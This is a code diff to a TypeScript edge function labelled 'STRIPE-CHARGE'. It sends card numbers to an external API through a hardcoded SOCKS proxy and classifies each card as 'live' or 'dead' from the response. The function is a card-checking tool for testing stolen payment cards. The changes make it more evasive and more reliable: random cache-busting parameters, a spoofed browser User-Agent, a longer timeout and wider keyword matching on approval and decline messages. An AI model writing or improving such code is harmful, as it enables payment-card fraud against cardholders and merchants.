@@ -16,25 +16,36 @@ const PROXY_IP = "138.197.124.55";
 const PROXY_PORT = "9150";
 const PROXY_TYPE = "sock5";
 
-// Fast API call with 30s timeout
+// API call with 50s timeout (max for edge functions ~60s)
 const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
-  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
+  const timestamp = Date.now();
+  const randomId = Math.random().toString(36).substring(2, 10);
+  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}&_t=${timestamp}&_r=${randomId}`;
   
-  console.log(`[STRIPE-CHARGE] API call started`);
+  console.log(`[STRIPE-CHARGE] API call: ${apiUrl}`);
   
   const controller = new AbortController();
-  const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout for speed
+  const timeoutId = setTimeout(() => controller.abort(), 50000); // 50s timeout
   
   try {
     const response = await fetch(apiUrl, {
       method: 'GET',
-      headers: { 'Accept': '*/*' },
+      headers: { 
+        'Accept': '*/*',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Cache-Control': 'no-cache',
+      },
       signal: controller.signal,
     });
     
     clearTimeout(timeoutId);
     const rawText = await response.text();
-    console.log(`[STRIPE-CHARGE] Response: ${rawText.substring(0, 100)}`);
+    console.log(`[STRIPE-CHARGE] Response (${response.status}): ${rawText.substring(0, 200)}`);
+    
+    // Handle empty response
+    if (!rawText || rawText.trim() === '') {
+      return { status: 'unknown', message: 'Empty response', rawResponse: 'Empty' };
+    }
     
     let apiStatus = 'unknown';
     let apiMessage = rawText;
@@ -43,20 +54,29 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
       const json = JSON.parse(rawText);
       apiMessage = json.message || json.msg || rawText;
       
-      // Quick status detection
+      // Status detection: prioritize full_response boolean
       if (json.full_response === true) {
         apiStatus = 'live';
       } else if (json.full_response === false) {
         apiStatus = 'dead';
       } else {
+        // Fallback to keyword detection
         const lower = apiMessage.toLowerCase();
-        if (lower.includes('success') || lower.includes('charged')) apiStatus = 'live';
-        else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient')) apiStatus = 'dead';
+        if (lower.includes('success') || lower.includes('charged') || lower.includes('approved')) {
+          apiStatus = 'live';
+        } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
+                   lower.includes('insufficient') || lower.includes('card_declined') || lower.includes('incorrect')) {
+          apiStatus = 'dead';
+        }
       }
     } catch {
+      // Non-JSON response - parse as text
       const lower = rawText.toLowerCase();
-      if (lower.includes('charged') || lower.includes('success')) apiStatus = 'live';
-      else if (lower.includes('declined') || lower.includes('invalid')) apiStatus = 'dead';
+      if (lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
+        apiStatus = 'live';
+      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('error')) {
+        apiStatus = 'dead';
+      }
     }
     
     return { status: apiStatus, message: apiMessage, rawResponse: rawText };
@@ -64,8 +84,9 @@ const callApi = async (cc: string): Promise<{ status: string; message: string; r
   } catch (error) {
     clearTimeout(timeoutId);
     const errMsg = error instanceof Error ? error.message : 'Failed';
-    const isTimeout = errMsg.includes('abort');
-    return { status: 'unknown', message: isTimeout ? 'Timeout' : errMsg, rawResponse: errMsg };
+    const isTimeout = errMsg.includes('abort') || errMsg.includes('timeout');
+    console.error(`[STRIPE-CHARGE] Error: ${errMsg}`);
+    return { status: 'unknown', message: isTimeout ? 'API timeout (50s)' : errMsg, rawResponse: errMsg };
   }
 };
 
